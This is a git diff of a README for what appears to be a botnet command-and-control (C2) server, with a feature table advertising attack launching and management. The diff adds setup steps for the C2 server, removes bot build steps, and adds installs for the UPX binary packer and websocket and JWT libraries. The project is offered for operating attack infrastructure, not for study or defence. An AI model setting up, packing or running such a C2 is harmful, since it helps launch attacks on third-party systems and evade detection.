@@ -86,21 +86,35 @@ All Files mainly uploaded just need fixes and to be stable and to make it just w
 | [🧨 Attack Management](https://github.com/user-attachments/assets/531f09ef-ae28-4bcc-aae4-aaa564162acd) | Launching and managing attacks                 | ✅ |
 | [🛡️ Admin Controls](https://github.com/user-attachments/assets/e2b9535f-5ede-401c-bb2d-da97b601a118) | User management, audit logs, system controls   | ✅ |
 
-### Installation
+### Server / C2
 ```bash
 # Generate certificates
-chmod +x generate_certs.sh
+chmod +x generate_certs.sh setup_C2.sh 
 ./generate_certs.sh
+./setup_C2.sh 
 
 # Build server
 go build -o cnc main.go
 
-# Build bots (multiple architectures)
-chmod +x build.sh
-./build.sh
-
 # Start server
 ./cnc
+```
+
+### Install needed packages / Tools
+```
+# UPX (compression) - Openssl (Certs) - 
+sudo apt install upx-ucl
+
+# Binary packer (optional)
+go install github.com/upx/upx@lates
+
+# JSON Parser - JWT Token - WS support - Logging library 
+go get github.com/json-iterator/go
+go get github.com/golang-jwt/jwt/v5
+go get github.com/gorilla/websocket
+go get github.com/rs/zerolog
+
+
 ```
 
 ## 🔐 Security Features
